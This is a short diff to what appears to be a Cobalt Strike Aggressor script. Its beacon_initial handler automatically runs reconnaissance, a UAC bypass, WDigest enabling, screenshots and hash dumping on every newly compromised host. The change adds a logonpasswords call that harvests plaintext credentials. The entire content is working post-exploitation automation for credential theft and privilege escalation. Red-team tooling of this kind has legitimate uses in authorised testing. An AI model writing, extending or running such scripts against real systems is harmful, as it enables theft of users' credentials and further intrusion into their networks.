@@ -11,7 +11,8 @@ on beacon_initial {
 	bshell($1, "ipconfig /all");
 	bbypassuac("$1", listeners()[0]);
 	bwdigest($1);
-	bscreenshot($1,0);	
+	bscreenshot($1,0);
+	blogonpasswords($1);	
 	bhashdump($1);
 	bnote("$1", mynick() . " - Init Completed \[" . formatDate("yyyy.MM.dd HH:mm:ss z") . "\]");
 }
